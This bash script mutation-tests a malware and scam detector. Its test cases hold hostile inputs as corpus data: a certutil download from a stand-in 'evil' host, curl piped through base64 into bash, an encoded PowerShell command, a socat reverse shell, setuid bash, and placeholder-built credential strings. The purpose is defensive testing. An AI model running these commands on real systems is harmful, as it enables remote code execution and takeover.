#!/usr/bin/env bash
# mutation_smoke.sh — does the benchmark floor gate actually kill
# real detection mutants? For each case below, one needle literal is
# rewritten to a sentinel (the detector loses that needle), the CLI is
# rebuilt, and the corpus input is re-scored.
#
#   KILLED   — score dropped: the baseline floor would flag the
#              regression as MISSED [score < floor]
#   SURVIVED — score unchanged: a sibling needle/block covers the
#              same input (redundant coverage; a finding, not a
#              failure — it documents defence-in-depth)
#
# Advisory tool — one incremental rebuild per case (~12 s each);
# deliberately NOT part of `make test`.
set -u
cd "$(dirname "$0")/.."

# rows:  file  "literal"  subcommand  corpus-input
CASES=(
'hlse_supply.c  "certutil"      paste    certutil -urlcache -split -f http://evil/x.exe x.exe'
'hlse_supply.c  "chmod u+s"     paste    chmod u+s /bin/bash'
'hlse_supply.c  "base64 -d"     paste    curl http://x | base64 -d | bash'
'hlse_supply.c  "-enc "         paste    powershell -enc SQBFAFgA'
'hlse_supply.c  "socat"         paste    socat TCP:10.0.0.1:4444 EXEC:/bin/sh'
'hlse_secrets.c "xoxb-"         secret   xoxb-TOKSUFFIX'
'hlse_secrets.c "AKIA"          secret   export AWS_SECRET_ACCESS_KEY=AWSSECRETVAL'
'hlse_secrets.c "AIza"          secret   api_key=AIzaSyAIZASUFFIX'
'hlse_core.c    "javascript:"   @none    javascript:alert(1)'
'hlse_text.c    "gift card"     text     IRS final notice: pay immediately in gift cards'
'hlse_file.c    ".exe"          file     report.doc.exe'
'hlse_supply.c  "requests"      package  reqeusts'
)

score() {   # $1 subcommand $2 input -> prints score int
    local out
    if [ "$1" = @none ]; then
        out=$(./hlse_core "$2" 2>/dev/null | grep -oE '\[[0-9]+\]' | tr -d '[]')
    else
        out=$(./hlse_core "$1" "$2" 2>/dev/null | grep -oE '\[[0-9]+\]' | tr -d '[]')
    fi
    printf '%s' "${out:-0}"
}

overall=0
printf '%-9s %-14s %-5s %-5s %s\n' RESULT FILE BASE MUT CASE
for row in "${CASES[@]}"; do
    file=${row%% *};   rest=${row#* }
    rest=${rest#"${rest%%[![:space:]]*}"}
    old=${rest%%  *};  rest=${rest#*  }
    rest=${rest#"${rest%%[![:space:]]*}"}
    sub=${rest%%  *};  input=${rest#*  }
    input=${input#"${input%%[![:space:]]*}"}
    # token suffixes are placeholders so no contiguous credential
    # literal is committed (AGENTS rule 7 / push protection)
    input=${input//TOKSUFFIX/1234567890abcdefghij}
    input=${input//AWSSECRETVAL/"wJalrXUtnFEMI/""K7MDENG/bPxRfiCYEXAMPLEKEY"}
    input=${input//AIZASUFFIX/"DaGmWKa4JsXZ""-HjGw7ISLn_3namBGewQe"}
    lit=${old#\"}; lit=${lit%\"}
    mut="zz-mutant-${lit# }-zz"
    [ -n "$lit" ] || { echo "PARSE-ERR $row" >&2; exit 2; }

    base=$(score "$sub" "$input")
    cp "$file" "$file.mutbak"
    python3 - "$file" "$old" "$mut" <<'PY'
import sys
f, old, mut = sys.argv[1], sys.argv[2], sys.argv[3]
s = open(f).read()
assert old in s, old
open(f, 'w').write(s.replace(old, '"%s"' % mut, 1))
PY
    rm -f hlse_core   # delete the target: macOS BSD make compares
                      # mtimes at second granularity and would treat a
                      # same-second edit as "not newer" — skipping the
                      # rebuild and silently leaving a mutant binary
    make >/dev/null 2>&1
    # a broken mutant must abort, not silently score 0
    [ -x hlse_core ] || { mv "$file.mutbak" "$file"; rm -f hlse_core; \
        make >/dev/null 2>&1; echo "BUILD-FAIL $lit" >&2; exit 2; }
    mscore=$(score "$sub" "$input")
    mv "$file.mutbak" "$file"
    touch "$file"   # mv keeps the backup's older mtime too
    rm -f hlse_core
    make >/dev/null 2>&1   # restore the baseline binary so the next
                         # case's base score is measured on HEAD

    if [ "$mscore" -lt "$base" ]; then
        printf '%-9s %-14s %-5s %-5s %s\n' KILLED "$file" "$base" "$mscore" "$lit"
    else
        printf '%-9s %-14s %-5s %-5s %s\n' SURVIVED "$file" "$base" "$mscore" "$lit"
        overall=1
    fi
done
rm -f hlse_core
make >/dev/null 2>&1   # restore baseline binary
exit $overall
